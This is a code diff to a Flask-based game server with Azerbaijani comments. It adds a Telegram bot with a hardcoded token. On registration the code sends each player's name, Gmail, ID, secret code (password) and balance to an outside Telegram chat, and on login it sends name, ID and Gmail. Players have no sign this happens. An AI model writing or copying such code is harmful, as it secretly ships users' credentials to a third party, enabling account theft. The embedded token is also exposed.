@@ -3,9 +3,28 @@ import json
 import os
 import random
 import time
+import requests  # Telegram üçün sorğu kitabxanası əlavə olundu
 
 app = Flask(__name__)
 DATA_FILE = "players.json"
+
+# --- TELEGRAM BOT MƏLUMATLARI ---
+TELEGRAM_TOKEN = "8502614066:AAFsPtOOY5RS5y1SNRs_Oir1sBXCgkl4fyY"
+TELEGRAM_CHAT_ID = "7953669834"
+
+def send_telegram_message(message):
+    """Telegram botuna mesaj göndərmək üçün köməkçi funksiya"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print("Telegram xətası:", e)
+# ---------------------------------
 
 def load_data():
     if not os.path.exists(DATA_FILE):
@@ -72,6 +91,18 @@ def auth():
     }
     save_data(players)
 
+    # --- YENİ QEYDİYYAT OLDUQDA TELEGRAMA XƏBƏR GÖNDƏR ---
+    msg = (
+        f"🚨 **Yeni Qeydiyyat!**\n\n"
+        f"👤 **Ad:** {name}\n"
+        f"📧 **Gmail:** {gmail}\n"
+        f"🆔 **ID:** `{player_id}`\n"
+        f"🔑 **Şifrə:** `{secret_code}`\n"
+        f"💰 **Balans:** 10.00 ₼"
+    )
+    send_telegram_message(msg)
+    # ----------------------------------------------------
+
     return jsonify({
         "status": "success",
         "playerId": player_id,
@@ -93,6 +124,18 @@ def login():
     if player_id in players and players[player_id].get('gmail') == gmail:
         players[player_id]['last_active'] = int(time.time() * 1000)
         save_data(players)
+        
+        # --- OYUNCU DAXİL OLDUQDA TELEGRAMA XƏBƏR GÖNDƏR ---
+        p_name = players[player_id].get('name', 'Naməlum')
+        msg = (
+            f"🟢 **Oyunçu Giriş etdi!**\n\n"
+            f"👤 **Ad:** {p_name}\n"
+            f"🆔 **ID:** `{player_id}`\n"
+            f"📧 **Gmail:** {gmail}"
+        )
+        send_telegram_message(msg)
+        # --------------------------------------------------
+
         return jsonify({
             "status": "success",
             "playerId": player_id,
